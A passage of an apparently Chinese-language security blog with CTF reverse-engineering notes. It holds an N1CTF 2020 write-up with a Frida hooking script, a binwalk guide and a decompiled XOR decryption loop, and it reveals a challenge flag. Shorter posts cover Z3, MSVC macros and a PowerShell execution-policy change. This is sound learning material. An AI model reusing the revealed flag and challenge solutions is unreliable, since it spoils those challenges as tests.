</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = Process.findModuleByName(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> base = <span class="built_in">module</span>.base;</span><br><span class="line">    <span class="built_in">console</span>.log(ptr(base.add(ptr(offset))).readCString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_native</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = Process.findModuleByName(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> base = <span class="built_in">module</span>.base;</span><br><span class="line">    <span class="keyword">var</span> sub_12930 = base.add(<span class="number">0x12930</span>);</span><br><span class="line">    Interceptor.attach(sub_12930, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.arg0 = args[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_12930 onEnter:&quot;</span>, hexdump(<span class="built_in">this</span>.arg0), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_12930 onLeave:&quot;</span>, hexdump(retval));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> sub_122A0 = base.add(<span class="number">0x122A0</span>);</span><br><span class="line">    Interceptor.attach(sub_122A0, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.arg0 = args[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">this</span>.arg1 = args[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">this</span>.arg2 = args[<span class="number">2</span>]</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_122A0 onEnter: &quot;</span>,ptr(<span class="built_in">this</span>.arg0).readCString(),ptr(<span class="built_in">this</span>.arg1).readCString(),ptr(<span class="built_in">this</span>.arg2).readCString())</span><br><span class="line">&#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;sub_122A0 onLeave:&quot;</span>, hexdump(retval))</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    hook_native();</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>
<h2 id="Oh-my-julia"><a href="#Oh-my-julia" class="headerlink" title="Oh my julia"></a>Oh my julia</h2><blockquote>
<p>对于JIT型语言的技巧，就是找到编译后的代码</p>
<ol>
<li><p>当程序要求输入时断下</p>
</li>
<li><p>单步执行直到程序输出东西</p>
</li>
<li><p>在输入/常量flag部分下硬件断点</p>
</li>
</ol>
<p>之后就可以把编译后的代码dump下来用于后续分析</p>
</blockquote>
<p>// TODO 果然还是基本功，先做点简单的</p>
<h2 id="BabyOS"><a href="#BabyOS" class="headerlink" title="BabyOS"></a>BabyOS</h2><h3 id="binwalk使用指南"><a href="#binwalk使用指南" class="headerlink" title="binwalk使用指南"></a>binwalk使用指南</h3><ul>
<li><p>查看固件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压压缩包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 文件名 # 解压压缩包</span><br><span class="line">binwalk -eM -d depth 文件名 # M表示递归解压，depth为深度，不指定默认为8</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压指定类型文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e -D=type 文件名 # type是要解压的类型，我已知的elf,jpeg</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p><a target="_blank" rel="noopener" href="https://github.com/hzcx998/xbook2">xbook2</a>操作系统是一个大学生写的，tqlOrzzzzzz。这个操作系统的信息可以使用strings看出来，其中有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1564: D:&#x2F;Developmemts&#x2F;github&#x2F;xbook2&#x2F;src&#x2F;include&#x2F;xbook&#x2F;schedule.h</span><br></pre></td></tr></table></figure>
<p>从而找到这个操作系统相关的信息</p>
<p>运行操作系统，列出文件，发现一个n1ctf程序，可以运行。这个程序位于xbook2-file1.img，使用binwalk解出来</p>
<p>但是程序似乎是加密的。</p>
<p>使用binwalk扫第一个a.img，解出一个程序，丢进IDA，发现这是一个操作系统程序(因为看见kernel等字样了)</p>
<p>然后找到一个do_execute函数，这个函数里面发现了加密逻辑。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">v7 = sys_open(v17, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v19 = sys_open(<span class="string">&quot;/tmp/decrypt&quot;</span>, <span class="number">28</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v19 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sys_lseek(v7, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    sys_lseek(v7, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v9 = kmalloc(v8);</span><br><span class="line">    v10 = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sys_read(v7, v9, v8) == v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = <span class="built_in">strlen</span>(<span class="string">&quot;xpawqejc4654wqqwe123%#%3213&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v10 + v13) ^= aXpawqejc4654wq[v13 % v12] ^ (<span class="keyword">unsigned</span> __int8)v13;</span><br><span class="line">            ++v13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v13 != v8 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( sys_write(v19, v10, v8) == v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          kfree(v10);</span><br><span class="line">          sys_close(v19);</span><br><span class="line">          sys_close(v7);</span><br><span class="line">          v14 = sys_open(<span class="string">&quot;/tmp/decrypt&quot;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v14 &gt;= <span class="number">0</span> )用</span><br></pre></td></tr></table></figure>
<p>使用这个解密出n1ctf程序</p>
<h3 id="n1ctf程序"><a href="#n1ctf程序" class="headerlink" title="n1ctf程序"></a>n1ctf程序</h3><p>// TODO</p>
<h2 id="BabyCompiler"><a href="#BabyCompiler" class="headerlink" title="BabyCompiler"></a>BabyCompiler</h2><p>// TODO</p>
<h2 id="Fixed-Camera"><a href="#Fixed-Camera" class="headerlink" title="Fixed Camera"></a>Fixed Camera</h2><p>是一个il2cpp程序</p>
<p>il2cpp编译后的逻辑位于GameAssembly.dll中，但是不知道函数都是啥，而且函数很多。</p>
<p>使用il2cppdump解出Assembly-Csharp.dll，可以找到函数的函数名和VA，再回头看GameAssembly.dll，可以分析。</p>
<p>patch cam的Update函数，把负数的限制扩大，然后就可以获得flag了</p>
<p>在移动过程中可能有加密，但是到-50时出现flag</p>
<p><code>n1ctf&#123;enbrypt_value&#125;</code></p>
<h2 id="rrr"><a href="#rrr" class="headerlink" title="rrr"></a>rrr</h2><p>// 此题看不懂</p>
<h2 id="N1vault"><a href="#N1vault" class="headerlink" title="N1vault"></a>N1vault</h2><p>// TODO</p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/20/writeup/n1ctf2020/wp/">
    <time datetime="2020-10-20T05:59:47.000Z" class="entry-date">
        2020-10-20
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-note/rev/buuoj-1" class="post-note/rev/buuoj-1 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/18/note/rev/buuoj-1/">buuoj中学到的东西--键盘扫描码</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/18/note/rev/buuoj-1/" data-id="ckghc9qiq000044wb0qxjh3nh" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="键盘扫描码"><a href="#键盘扫描码" class="headerlink" title="键盘扫描码"></a>键盘扫描码</h2><p>问题来源于逆向题BabyDirver</p>
<p>这道题本来是迷宫问题，判断条件是37,38。这里是键盘扫描码，和ascii码不同。</p>
<p>注意驱动中的编码问题。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43876357/article/details/108523865">buuoj-babydriver</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://www.supfree.net/search.asp?id=6386">键盘扫描码</a></p>
<h2 id="二叉树的还原"><a href="#二叉树的还原" class="headerlink" title="二叉树的还原"></a>二叉树的还原</h2><p>问题来自于buuoj[2019红帽杯]childRE</p>
<p>二叉树，给定先序和中序遍历，还原过程如下</p>
<p>先序遍历中，根节点总是第一个遍历，找到根节点之后就可以在中序遍历中分开左右子树节点。在左右子树中分别应用这个规律。</p>
<p>给定后续遍历时，根节点总是最后一个被遍历，还原过程和先序遍历类似</p>
<h2 id="MSVC预定义宏"><a href="#MSVC预定义宏" class="headerlink" title="MSVC预定义宏"></a>MSVC预定义宏</h2><p><strong>FUNCDNAME</strong>定义为封闭函数修饰名的字符串文本，这个宏只在函数中定义</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Demonstrates functionality of __FUNCTION__, __FUNCDNAME__, and __FUNCSIG__ macros</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exampleFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function name: %s\n&quot;</span>, __FUNCTION__);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decorated function name: %s\n&quot;</span>, __FUNCDNAME__);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function signature: %s\n&quot;</span>, __FUNCSIG__);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sample Output</span></span><br><span class="line">    <span class="comment">// -------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Function name: exampleFunction</span></span><br><span class="line">    <span class="comment">// Decorated function name: ?exampleFunction@@YAXXZ</span></span><br><span class="line">    <span class="comment">// Function signature: void __cdecl exampleFunction(void)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以用UnDecorateSymbolName进行反修饰得到函数签名</p>
<p>修饰名是链接器用于查找方法使用的</p>
<p>参考资料 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/preprocessor/predefined-macros?view=vs-2019">预定义宏 | Microsoft Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/build/reference/decorated-names?view=vs-2019">修饰名 | Microsoft Docs</a></p>
<h2 id="bool类型比较和赋值"><a href="#bool类型比较和赋值" class="headerlink" title="bool类型比较和赋值"></a>bool类型比较和赋值</h2><p>示例代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">bool</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a==b); <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;%d\n&quot;</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     BYTE PTR [rbp-1], 1</span><br><span class="line">        mov     BYTE PTR [rbp-2], 1</span><br><span class="line">        movzx   eax, BYTE PTR [rbp-1]</span><br><span class="line">        cmp     al, BYTE PTR [rbp-2]</span><br><span class="line">        sete    al</span><br><span class="line">        movzx   eax, al</span><br><span class="line">        mov     esi, eax</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，编译器是通过cmp,setne命令组合赋值的</p>
<p>那如果是变量赋值呢</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">bool</span> c=b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a==c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;%d\n&quot;</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     BYTE PTR [rbp-1], 1</span><br><span class="line">        mov     DWORD PTR [rbp-8], 2</span><br><span class="line">        cmp     DWORD PTR [rbp-8], 0</span><br><span class="line">        setne   al</span><br><span class="line">        mov     BYTE PTR [rbp-9], al</span><br><span class="line">        movzx   eax, BYTE PTR [rbp-1]</span><br><span class="line">        cmp     al, BYTE PTR [rbp-9]</span><br><span class="line">        sete    al</span><br><span class="line">        movzx   eax, al</span><br><span class="line">        mov     esi, eax</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<h2 id="MFC程序逆向"><a href="#MFC程序逆向" class="headerlink" title="MFC程序逆向"></a>MFC程序逆向</h2><p>出自[HDCTF2019]MFC</p>
<p>可以使用xspy查看程序收到消息的函数，发送消息需要先找到窗体再发送消息</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/18/note/rev/buuoj-1/">
    <time datetime="2020-10-18T11:05:12.000Z" class="entry-date">
        2020-10-18
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-note/win/win-1" class="post-note/win/win-1 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/18/note/win/win-1/">power shell 禁止执行脚本的解决方法</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/18/note/win/win-1/" data-id="ckgeoaet500004cwb7gdud6ca" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>Windows Power Shell执行脚本有一定的策略</p>
<ul>
<li>Restricted 不允许任何脚本执行</li>
<li>AllSigned RemoteSigned 防止执行未签名脚本</li>
</ul>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol>
<li><p>使用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-executionpolicy</span></span><br></pre></td></tr></table></figure>
<p>获取脚本执行策略，一般情况为restricted</p>
</li>
<li><p>使用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> remotesigned</span><br></pre></td></tr></table></figure>
<p>将策略设置为远程脚本需要签名，需要管理员权限</p>
</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4eaad2163567">PowerShell：因为在此系统上禁止运行脚本，解决方法</a></p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>:peach:</p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/18/note/win/win-1/">
    <time datetime="2020-10-18T05:28:34.000Z" class="entry-date">
        2020-10-18
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-note/rev/z3" class="post-note/rev/z3 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/18/note/rev/z3/">Z3使用简介</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/18/note/rev/z3/" data-id="ckgeoaeta00014cwb64n7fv48" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>z3是巨硬开发的开源线性约束求解器</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ol>
<li>Int</li>
<li>Real</li>
<li>BitVec</li>
<li>文档</li>
</ol>
<h2 id="使用一般步骤"><a href="#使用一般步骤" class="headerlink" title="使用一般步骤"></a>使用一般步骤</h2><ol>
<li><p>定义数据类型</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 定义一个数学上的整数整数</span></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span>%i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">6</span>] <span class="comment"># 定义6个32位整数型位向量，就是C/C++中的int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加约束</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s &#x3D; Solver()</span><br><span class="line">s.add(x[0]+x[1]&lt;10)</span><br><span class="line">s.add(x[0]&#x3D;&#x3D;2)</span><br><span class="line">s.add(x[0]+x[3]&#x3D;&#x3D;5)</span><br></pre></td></tr></table></figure>
</li>
<li><p>求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat: <span class="comment">#如果约束满足</span></span><br><span class="line">    m = s.model() <span class="comment"># 满足的模型</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(i.as_long()) <span class="comment"># 转化为长整型</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>上述情况只能找到一种满足情况的解，可能存在溢出</p>
</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/30548907">z3一把梭</a></p>
<p>[2] [vscode自动补全功能]</p>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>全部代码(这个例子溢出，所以不相等)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%i&#x27;</span>%i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x[<span class="number">0</span>]==<span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(x[<span class="number">1</span>]==<span class="number">0x20CAACF4</span>)</span><br><span class="line">s.add(x[<span class="number">5</span>]==<span class="number">0x84F30420</span>)</span><br><span class="line">s.add(x[<span class="number">2</span>]-x[<span class="number">3</span>]==<span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]+x[<span class="number">4</span>]==<span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(x[<span class="number">2</span>]-x[<span class="number">4</span>]==<span class="number">0x42D731A8</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x[3]-x[4]=0x42d731a8-0x84a236ff</span></span><br><span class="line"><span class="string">x[3] = (0x42d731a8-0x84a236ff+0xfa6cb703)/2;</span></span><br><span class="line"><span class="string">x[2] = x[3]+0x84a236ff;</span></span><br><span class="line"><span class="string">x[4] = 0xfa6cb703-x[3];</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">while</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        res.append(m[i].as_long())</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/18/note/rev/z3/">
    <time datetime="2020-10-18T05:12:57.000Z" class="entry-date">
        2020-10-18
    </time>
</a>
    
    
    </footer>
</article>






  
  
    <nav id="pagination">
      <nav id="page-nav">
        <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
      </nav>
    </nav>
  

</div></div>
        <div id="secondary" class="widget-area" role="complementary">
  
    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
    <div>
        <input type="text" value="" name="s" id="s" />
        <input type="submit" id="searchsubmit" value="搜索" />
    </div>
</form></aside>
  
    
  
    
  
    
  <aside class="widget">
    <h3 class="widget-title">Recents</h3>
    <div class="widget-content">
      <ul>
        
          <li>
            <a href="/2020/11/27/note/papers/1-1/">app行为的语义提取方案读论文笔记</a>
          </li>
        
          <li>
            <a href="/2020/11/26/note/rev/qiling/">麒麟框架使用--官方示例</a>
          </li>
        
          <li>
            <a href="/2020/11/24/note/web/pentist-1/">靶机看答案渗透记录-1</a>
          </li>
        
          <li>
            <a href="/2020/11/20/writeup/kctf2020-10/wp/">kctf2020部分wp</a>
          </li>
        
          <li>
            <a href="/2020/11/20/note/web/DiD/">网络安全中的纵深防御概念</a>
          </li>
        
      </ul>
    </div>
  </aside>

  
    
  
    
  
</div>
      </div>
      <footer id="colophon" role="contentinfo">
    <p>&copy; 2020 John Doe
    All rights reserved.</p>
    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</footer>
    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>

<script src="/js/jquery-3.3.1.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


<script src="/js/navigation.js"></script>

<div id="bg"></div>

  </div>
</body>
</html>